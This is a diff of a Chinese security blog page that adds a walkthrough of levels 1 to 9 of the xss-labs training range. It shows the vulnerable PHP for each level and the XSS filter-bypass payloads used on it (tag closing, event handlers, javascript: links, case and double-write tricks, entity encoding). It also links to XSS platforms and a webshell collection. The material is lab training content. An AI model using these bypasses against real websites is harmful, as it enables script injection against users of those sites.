@@ -443,12 +443,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -466,14 +479,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    3.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    15 分
                 </div>
                 
 
@@ -493,7 +506,434 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="WEB漏洞-XSS跨站之订单及Shell箱子反杀记"><a href="#WEB漏洞-XSS跨站之订单及Shell箱子反杀记" class="headerlink" title="WEB漏洞-XSS跨站之订单及Shell箱子反杀记"></a><font size="6"><strong>WEB漏洞-XSS跨站之订单及Shell箱子反杀记</strong></font></h2><span id="more"></span>
+
+<h3 id="一、涉及资源"><a href="#一、涉及资源" class="headerlink" title="一、涉及资源"></a><font size="5"><strong>一、涉及资源</strong></font></h3><p><a target="_blank" rel="noopener" href="https://xss8.cc/">https://xss8.cc/</a><br><a target="_blank" rel="noopener" href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p>
+<p><a target="_blank" rel="noopener" href="http://xss.fbisb.com/">http://xss.fbisb.com/</a><br><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br><a target="_blank" rel="noopener" href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a><br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA">https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA</a> 提取码：xiao<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw">https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw</a> 提取码：xiao</p>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/1.png"></p>
+<h3 id="二、xss-labs靶场搭建"><a href="#二、xss-labs靶场搭建" class="headerlink" title="二、xss-labs靶场搭建"></a><font size="5"><strong>二、xss-labs靶场搭建</strong></font></h3><p>通关手册：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wo41ge/article/details/107459332">https://blog.csdn.net/wo41ge/article/details/107459332</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43669045/article/details/107932942">https://blog.csdn.net/weixin_43669045/article/details/107932942</a></p>
+<p>靶场项目地址：<a target="_blank" rel="noopener" href="https://codeload.github.com/do0dl3/xss-labs/zip/refs/heads/master">https://codeload.github.com/do0dl3/xss-labs/zip/refs/heads/master</a></p>
+<h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a><font size="4"><strong>level1</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>--STATUS OK--<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span>
+<span class="token operator">&lt;</span>head<span class="token operator">></span>
+<span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"content-type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=utf-8"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>
+window.alert <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+confirm<span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ window.location.href<span class="token operator">=</span><span class="token string">"level2.php?keyword=test"</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+<span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>title<span class="token operator">></span>欢迎来到level1<span class="token operator">&lt;</span>/title<span class="token operator">></span>
+<span class="token operator">&lt;</span>/head<span class="token operator">></span>
+<span class="token operator">&lt;</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span>h1 align<span class="token operator">=</span>center<span class="token operator">></span>欢迎来到level1<span class="token operator">&lt;</span>/h1<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>欢迎用户"</span><span class="token keyword">.</span><span class="token variable">$str</span><span class="token keyword">.</span><span class="token string">"&lt;/h2>"</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level1.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>/body<span class="token operator">></span>
+<span class="token operator">&lt;</span>/html<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/2.png"></p>
+<p>在上面的代码中可以看到传入参数name<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/3.png"></p>
+<p>将传入的参数替换为js代码执行<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/4.png"></p>
+<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a><font size="4"><strong>level2</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>--STATUS OK--<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span>
+<span class="token operator">&lt;</span>head<span class="token operator">></span>
+<span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"content-type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=utf-8"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>
+window.alert <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+confirm<span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ window.location.href<span class="token operator">=</span><span class="token string">"level3.php?writing=wait"</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+<span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>title<span class="token operator">></span>欢迎来到level2<span class="token operator">&lt;</span>/title<span class="token operator">></span>
+<span class="token operator">&lt;</span>/head<span class="token operator">></span>
+<span class="token operator">&lt;</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span>h1 align<span class="token operator">=</span>center<span class="token operator">></span>欢迎来到level2<span class="token operator">&lt;</span>/h1<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>
+&lt;form action=level2.php method=GET>
+&lt;input name=keyword  value="'</span><span class="token keyword">.</span><span class="token variable">$str</span><span class="token keyword">.</span><span class="token string">'">
+&lt;input type=submit name=submit value="搜索"/>
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level2.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>/body<span class="token operator">></span>
+<span class="token operator">&lt;</span>/html<span class="token operator">></span>
+</code></pre>
+<p>因为内容被嵌套在表单中的value属性内<input type=submit name=submit value="搜索"/> 所以需要先闭合input标签，”&gt;把前面的input标签闭合，然后在注入代码，闭合标签。最终构成以下代码</p>
+<pre class=" language-bash"><code class="language-bash">123"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/5.png"></p>
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a><font size="4"><strong>level3</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">"&lt;center>
+&lt;form action=level3.php method=GET>
+&lt;input name=keyword  value='"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"'>
+&lt;input type=submit name=submit value=搜索 />
+&lt;/form>
+&lt;/center>"</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level3.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>/body<span class="token operator">></span>
+<span class="token operator">&lt;</span>/html<span class="token operator">></span>
+</code></pre>
+<p>后端利用htmlspecialchars()函数会将特殊字符进行转义，这里无法采用标签，因为标签都是带有”&lt;”的。但该函数不会转义单引号，可以采用事件闭合标签.</p>
+<pre class=" language-bash"><code class="language-bash">playload： <span class="token string">' onclick='</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/6.png"></p>
+<h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a><font size="4"><strong>level4</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">">"</span>,<span class="token string">""</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span>,<span class="token string">""</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>
+&lt;form action=level4.php method=GET>
+&lt;input name=keyword  value="'</span><span class="token keyword">.</span><span class="token variable">$str3</span><span class="token keyword">.</span><span class="token string">'">
+&lt;input type=submit name=submit value=搜索 />
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level4.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+</code></pre>
+<p>可以看到的是&lt;&gt;都被替换为空，也就没法采用标签闭合的方式 C<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/7.png"></p>
+<h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a><font size="4"><strong>level5</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;script"</span>,<span class="token string">"&lt;scr_ipt"</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"on"</span>,<span class="token string">"o_n"</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>
+&lt;form action=level5.php method=GET>
+&lt;input name=keyword  value="'</span><span class="token keyword">.</span><span class="token variable">$str3</span><span class="token keyword">.</span><span class="token string">'">
+&lt;input type=submit name=submit value=搜索 />
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<p>限制了script和on字符—-&gt;替换成scr_pt 和o_n ，使用a标签的js伪协议实现href属性支持javascript:伪协议构造poc 产生一个链接</p>
+<pre class=" language-bash"><code class="language-bash">"<span class="token operator">></span> <span class="token operator">&lt;</span>a href<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span> <span class="token operator">></span> xss<span class="token operator">&lt;</span>/a<span class="token operator">></span> //
+</code></pre>
+<h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a><font size="4"><strong>level6</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;script"</span>,<span class="token string">"&lt;scr_ipt"</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"on"</span>,<span class="token string">"o_n"</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str4</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"src"</span>,<span class="token string">"sr_c"</span>,<span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str5</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"data"</span>,<span class="token string">"da_ta"</span>,<span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str6</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"href"</span>,<span class="token string">"hr_ef"</span>,<span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>
+&lt;form action=level6.php method=GET>
+&lt;input name=keyword  value="'</span><span class="token keyword">.</span><span class="token variable">$str6</span><span class="token keyword">.</span><span class="token string">'">
+&lt;input type=submit name=submit value=搜索 />
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level6.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+</code></pre>
+<p>限制了一系列的字符 但进行判断的是整个字符串，但是没有进行大小写绕过。</p>
+<pre class=" language-bash"><code class="language-bash">"<span class="token operator">></span><span class="token operator">&lt;</span>SCRIPT<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/SCRIPT<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/8.png"></p>
+<h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a><font size="4"><strong>level7</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span>strtolower<span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"script"</span>,<span class="token string">""</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"on"</span>,<span class="token string">""</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str4</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"src"</span>,<span class="token string">""</span>,<span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str5</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"data"</span>,<span class="token string">""</span>,<span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str6</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"href"</span>,<span class="token string">""</span>,<span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>
+&lt;form action=level7.php method=GET>
+&lt;input name=keyword  value="'</span><span class="token keyword">.</span><span class="token variable">$str6</span><span class="token keyword">.</span><span class="token string">'">
+&lt;input type=submit name=submit value=搜索 />
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level7.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+</code></pre>
+<p>限制了一系列的字符 大小写无法绕过，但因为只是替换，可以双写绕过。</p>
+<pre class=" language-bash"><code class="language-bash">"<span class="token operator">></span><span class="token operator">&lt;</span>scscriptript<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/scrscriptipt<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/9.png"><br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/10.png"></p>
+<h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a><font size="4"><strong>level8</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"script"</span>,<span class="token string">"scr_ipt"</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"on"</span>,<span class="token string">"o_n"</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str4</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"src"</span>,<span class="token string">"sr_c"</span>,<span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str5</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"data"</span>,<span class="token string">"da_ta"</span>,<span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str6</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"href"</span>,<span class="token string">"hr_ef"</span>,<span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str7</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">'"'</span>,<span class="token string">'&amp;quot'</span>,<span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">'&lt;center>
+&lt;form action=level8.php method=GET>
+&lt;input name=keyword  value="'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">'">
+&lt;input type=submit name=submit value=添加友情链接 />
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://www.matools.com/code-convert-unicode">https://www.matools.com/code-convert-unicode</a><br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/11.png"></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/12.png"></p>
+<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a><font size="4"><strong>level9</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"script"</span>,<span class="token string">"scr_ipt"</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"on"</span>,<span class="token string">"o_n"</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str4</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"src"</span>,<span class="token string">"sr_c"</span>,<span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str5</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"data"</span>,<span class="token string">"da_ta"</span>,<span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str6</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"href"</span>,<span class="token string">"hr_ef"</span>,<span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str7</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">'"'</span>,<span class="token string">'&amp;quot'</span>,<span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">'&lt;center>
+&lt;form action=level9.php method=GET>
+&lt;input name=keyword  value="'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">'">
+&lt;input type=submit name=submit value=添加友情链接 />
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+if<span class="token punctuation">(</span>false<span class="token operator">==</span><span class="token operator">=</span>strpos<span class="token punctuation">(</span><span class="token variable">$str7</span>,<span class="token string">'http://'</span><span class="token punctuation">))</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="您的链接不合法？有没有！">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+<span class="token keyword">else</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="'</span><span class="token keyword">.</span><span class="token variable">$str7</span><span class="token keyword">.</span><span class="token string">'">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level9.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+</code></pre>
+<p>通关代码if(false&#x3D;&#x3D;&#x3D;strpos($str7,’http:&#x2F;&#x2F;‘)) 判断是否包含http:&#x2F;&#x2F;然后返回,也就是说这里不能直接使用http:&#x2F;&#x2F;，因此这里要采用编码</p>
